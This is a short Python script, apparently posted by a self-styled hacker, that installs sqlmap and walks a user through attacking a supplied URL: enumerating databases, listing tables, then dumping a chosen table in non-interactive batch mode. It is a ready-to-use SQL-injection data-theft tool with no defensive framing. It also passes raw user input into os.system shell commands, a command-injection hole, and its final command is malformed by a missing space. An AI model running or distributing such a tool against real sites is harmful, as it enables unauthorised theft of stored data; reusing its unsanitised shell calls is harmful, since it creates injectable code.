#insta : 7snhacker
import os
os.system('clear') 
os.system('apt-get install sqlmap -y')
os.system("clear")
print("""
███████╗ ██████╗ ██╗      █████╗ ██╗   ██╗████████╗ ██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
███████╗██║   ██║██║     ███████║██║   ██║   ██║   ██║   ██║
╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║   ██║   ██║   ██║
███████║╚██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ╚██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
                                                            
""")
runn = os.system('sqlmap')                                                
a = input("the link : ")
sqll = os.system('sqlmap -u '+a+ " --dbs --batch")
d = input("database name : ")
dat = os.system('sqlmap -u '+a+ " -D "+d+" --tables --batch")
tt = input("the table : ")
table = os.system('sqlmap -u '+a+ "-D "+d+ " -T "+tt+ " --dump --batch")																								
											
							
	
		
		
									
											
